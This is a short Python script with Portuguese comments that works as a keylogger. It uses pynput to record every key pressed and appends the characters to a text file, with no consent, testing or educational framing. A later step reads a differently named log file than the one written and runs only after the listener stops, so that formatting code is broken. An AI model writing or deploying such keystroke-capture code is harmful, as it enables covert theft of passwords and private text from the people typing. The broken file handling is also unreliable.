from pynput.keyboard import Listener

def log(tecla):
    with open('arquivo.txt', 'a', encoding='utf-8') as arquivo_log:
        if hasattr(tecla, 'char'):
            arquivo_log.write(tecla.char)
        elif str(tecla) == "Key.space":
            arquivo_log.write(" ")
        elif str(tecla) == "Key.enter":
            arquivo_log.write("\n")
        elif str(tecla) == "Key.shift":
            pass  # Ignora a tecla Shift
        elif hasattr(tecla, 'name') and len(tecla.name) == 1:
            # Verifica se a tecla é um caractere único (incluindo números)
            arquivo_log.write(tecla.name)
        elif hasattr(tecla, 'name') and tecla.name.isdigit():
            # Verifica se a tecla é um número
            arquivo_log.write(tecla.name)

def formatar_saida(texto):
    # Remova o texto entre colchetes e formate a saída
    while "[" in texto and "]" in texto:
        inicio = texto.find("[")
        fim = texto.find("]")
        texto = texto[:inicio] + texto[fim + 1:]

    # Substitui as sequências de caracteres especiais
    texto = texto.replace("Key.enterKey.shift", "\n")
    texto = texto.replace("Key.enter", "\n")
    texto = texto.replace("Key.shift", "")
    

    return texto

with Listener(on_press=log) as monitor:
    monitor.join()

# Lê o arquivo de log e formata a saída
with open('Log.txt', 'r', encoding='utf-8') as arquivo_log:
    texto_log = arquivo_log.read()

texto_formatado = formatar_saida(texto_log)

# Escreve o texto formatado em um novo arquivo
with open('LogFormatado.txt', 'w', encoding='utf-8') as arquivo_formatado:
    arquivo_formatado.write(texto_formatado)
